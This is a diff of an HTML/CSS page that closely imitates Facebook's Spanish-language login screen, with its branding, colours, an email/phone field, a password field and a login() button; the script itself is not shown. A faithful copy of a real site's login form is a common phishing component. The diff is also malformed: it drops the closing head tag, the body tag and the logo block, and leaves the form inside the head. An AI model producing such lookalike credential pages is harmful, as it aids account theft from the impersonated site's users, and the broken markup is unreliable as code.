@@ -16,140 +16,130 @@
         margin: 0;
     }
 
-    /* Contenedor Principal de la Interfaz */
-    .main-container {
-        display: flex;
-        width: 980px; /* Ancho típico de la interfaz de Facebook en escritorio */
-        justify-content: space-between;
-        align-items: center; /* Centrar verticalmente ambos lados */
-        padding: 20px;
-    }
-
-    /* Estilos del contenido izquierdo (Logo y texto) */
-    .left-content {
-        width: 500px;
-        margin-bottom: 100px; /* Desplazar ligeramente hacia arriba el contenido izq. para centrado visual */
-    }
-
-    .facebook-logo {
-        font-size: 58px;
-        color: #1877f2;
-        font-weight: bold;
-        margin-bottom: 0;
-    }
-
-    .tagline {
-        font-size: 28px;
-        color: #1c1e21;
-        margin-top: 10px;
-        line-height: 32px;
-        font-weight: normal;
-    }
-
-    /* Estilos del Contenedor del Formulario */
-    .login-container {
-        background-color: white;
-        padding: 15px 15px 25px 15px; /* Ajuste de padding */
-        border-radius: 8px;
-        box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); /* Sombra más definida */
-        width: 396px; /* Ancho del formulario */
-        text-align: center;
-    }
-
-    /* Estilos para los campos de entrada (input) */
-    .input-field {
-        width: calc(100% - 22px);
-        padding: 14px 16px; /* Aumentar el padding para inputs */
-        margin: 8px 0;
-        border: 1px solid #dddfe2; /* Borde más sutil */
-        border-radius: 6px;
-        font-size: 17px;
-        box-sizing: border-box; /* Incluir padding y borde en el ancho total */
-    }
-
-    .input-field:focus {
-        outline: none;
-        border-color: #1877f2; /* Borde azul al enfocar */
-        box-shadow: 0 0 0 1px #1877f2;
-    }
-
-    /* Estilos para el botón de Iniciar Sesión */
-    .login-button {
-        width: 100%;
-        padding: 12px 0;
-        background-color: #1877f2; /* Azul principal de Facebook */
-        border: none;
-        color: white;
-        border-radius: 6px;
-        font-size: 20px;
-        font-weight: bold;
-        cursor: pointer;
-        margin-top: 5px;
-    }
-
-    .login-button:hover {
-        background-color: #166fe5; /* Azul más oscuro al pasar el ratón */
-    }
-
-    /* Estilos para el enlace "¿Olvidaste tu contraseña?" */
-    .forgot-password {
-        display: block;
-        text-decoration: none;
-        color: #1877f2;
-        font-size: 14px;
-        margin-top: 15px;
-        margin-bottom: 20px;
-    }
-
-    .forgot-password:hover {
-        text-decoration: underline;
-    }
-
-    /* Estilo para la línea divisoria */
-    .divider {
-        border-bottom: 1px solid #dadde1;
-        margin: 20px 0;
-    }
-
-    /* Estilos para el texto de 'Crear una página...' */
-    .create-page-text {
-        margin-top: 25px;
-        font-size: 14px;
-        color: #1c1e21;
-    }
-
-    .create-page-link {
-        font-weight: bold;
-        text-decoration: none;
-        color: #1c1e21;
-    }
-
-    .create-page-link:hover {
-        text-decoration: underline;
-    }
-
-  </style>
-</head>
-<body>
-  <div class="main-container">
-        <div class="left-content">
-      <h1 class="facebook-logo">facebook</h1>
-      <p class="tagline">Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
-    </div>
-
-        <div class="right-content">
-      <div class="login-container">
-                <input type="text" id="username" class="input-field" placeholder="Correo electrónico o número de teléfono" required>
-        <input type="password" id="password" class="input-field" placeholder="Contraseña" required>
-        <button onclick="login()" class="login-button">Iniciar sesión</button>
-        <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
-        <div class="divider"></div>
-              </div>
-      <div class="create-page-text">
-        <a href="#" class="create-page-link">Crea una página</a> para una celebridad, una marca o un negocio.
-      </div>
-    </div>
-  </div>
+    /* Contenedor Principal */
+    .main-container {
+      display: flex;
+      width: 980px;
+      justify-content: space-between;
+      align-items: center;
+      padding: 20px;
+    }
+    
+    /* Contenido izquierdo */
+    .left-content {
+      width: 500px;
+      margin-bottom: 100px;
+    }
+    
+    .facebook-logo {
+      font-size: 58px;
+      color: #1877f2;
+      font-weight: bold;
+      margin-bottom: 0;
+    }
+    
+    .tagline {
+      font-size: 28px;
+      color: #1c1e21;
+      margin-top: 10px;
+      line-height: 32px;
+      font-weight: normal;
+    }
+    
+    /* Contenedor del formulario */
+    .login-container {
+      background-color: white;
+      padding: 15px 15px 25px 15px;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+      width: 396px;
+      text-align: center;
+    }
+    
+    /* Campos de entrada */
+    .input-field {
+      width: calc(100% - 22px);
+      padding: 14px 16px;
+      margin: 8px 0;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 17px;
+      box-sizing: border-box;
+    }
+    
+    .input-field:focus {
+      outline: none;
+      border-color: #1877f2;
+      box-shadow: 0 0 0 1px #1877f2;
+    }
+    
+    /* Botón de inicio de sesión */
+    .login-button {
+      width: 100%;
+      padding: 12px 0;
+      background-color: #1877f2;
+      border: none;
+      color: white;
+      border-radius: 6px;
+      font-size: 20px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 5px;
+    }
+    
+    .login-button:hover {
+      background-color: #166fe5;
+    }
+    
+    /* Enlace de contraseña */
+    .forgot-password {
+      display: block;
+      text-decoration: none;
+      color: #1877f2;
+      font-size: 14px;
+      margin-top: 15px;
+      margin-bottom: 20px;
+    }
+    
+    .forgot-password:hover {
+      text-decoration: underline;
+    }
+    
+    /* Línea divisoria */
+    .divider {
+      border-bottom: 1px solid #dadde1;
+      margin: 20px 0;
+    }
+    
+    /* Texto crear página */
+    .create-page-text {
+      margin-top: 25px;
+      font-size: 14px;
+      color: #1c1e21;
+    }
+    
+    .create-page-link {
+      font-weight: bold;
+      text-decoration: none;
+      color: #1c1e21;
+    }
+    
+    .create-page-link:hover {
+      text-decoration: underline;
+    }
+  </style>
+    <div class="right-content">
+      <div class="login-container">
+        <input type="text" id="username" class="input-field" placeholder="Correo electrónico o número de teléfono" required>
+        <input type="password" id="password" class="input-field" placeholder="Contraseña" required>
+        <button onclick="login()" class="login-button">Iniciar sesión</button>
+        <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
+        <div class="divider"></div>
+      </div>
+      <div class="create-page-text">
+        <a href="#" class="create-page-link">Crea una página</a> para una celebridad, una marca o un negocio.
+      </div>
+    </div>
 
   <script>
     // EL CÓDIGO JAVASCRIPT SE MANTIENE INALTERADO
